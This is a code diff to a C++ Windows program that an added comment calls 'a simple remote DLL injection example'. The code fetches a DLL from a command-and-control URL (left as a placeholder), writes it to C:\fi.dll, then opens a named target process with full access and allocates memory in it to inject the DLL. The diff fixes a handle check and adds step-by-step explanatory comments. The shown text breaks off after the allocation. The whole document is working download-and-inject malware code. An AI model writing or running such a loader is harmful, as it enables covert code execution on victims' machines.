@@ -11,6 +11,8 @@
 #define _CRT_SECURE_NO_WARNINGS
 using namespace std;
 
+//A simple remote DLL injection example
+
 void GetPayload() {
 	char* lpBuffer = NULL;
 	DWORD numberOfBytesRead = 0;
@@ -22,19 +24,20 @@ void GetPayload() {
 		std::cerr << "error could not open handle to user agent: " << GetLastErrorAsString();
 	}
 	else {
-		//if using not relative url use InternetCanonicalizeUrl
+		//fetch the payload from the c2 get a handle to the resource. if using not relative url use InternetCanonicalizeUrl
 		HINTERNET iRsrc = InternetOpenUrlA(iOpen, "<url_path_to_remote_dll>", 0, 0, INTERNET_FLAG_RELOAD, 0);
-		if (iOpen == NULL) {
+		if (iRsrc == NULL) {
 			std::cerr << "could not access resource: " << GetLastErrorAsString();
 		}
 		else {
-			//create the file 
+			//get a handle to the file to be created on disk. the payload will be stored on the root of the C:\ drive. 
 			HANDLE hOut = CreateFile(L"C:\\fi.dll", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 			if (hOut == INVALID_HANDLE_VALUE) {
 				cerr << "could not create file: " << GetLastErrorAsString() << endl;
 			}
 			else {
 				do {
+					//read and write the file to a location on disk 
 					lpBuffer = new char[2000];
 					ZeroMemory(lpBuffer, 2000);
 						InternetReadFile(iRsrc, (LPVOID)lpBuffer, 2000, &numberOfBytesRead);
@@ -53,9 +56,9 @@ void GetPayload() {
 
 int executePayload() {
 	WIN32_FIND_DATAA fdata;
+	
+	//validate the payload was sucessfully downloaded
 	HANDLE findFile = FindFirstFileA("C:\\fi.dll", &fdata);
-
-
 	if (findFile == INVALID_HANDLE_VALUE) {
 		cerr << "Could not find fild data" << GetLastErrorAsString();
 		return -1;
@@ -64,6 +67,7 @@ int executePayload() {
 		std::string pname, dllpath;
 		PROCESS_ACTIONS::ProcActions<DWORD> obj;
 
+		//specifiy the name of the app to be targeted and path of the dll.
 		const char* p = "<app_name_here>"; const char* d = "C:\\fi.dll";
 		if (obj.getProcessIDbyName(p) == 0) {
 			cerr << "[ERROR] The process specified was not found." << std::endl;
@@ -74,12 +78,14 @@ int executePayload() {
 			return -1;
 		}
 		else {
+			//open a handle to the process specified
 			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, obj.getProcessIDbyName(p));
 			if (hProcess == NULL) {
 				cerr << "Could not open process" << GetLastErrorAsString();
 				return -1;
 			}
 			else {
+
 				LPVOID dllP = VirtualAllocEx(hProcess, 0, strlen(d) + 1, MEM_COMMIT, PAGE_READWRITE);
 				if (dllP == NULL) {
 					cerr << "Failed to allocate memory in process. " << GetLastErrorAsString() << endl;
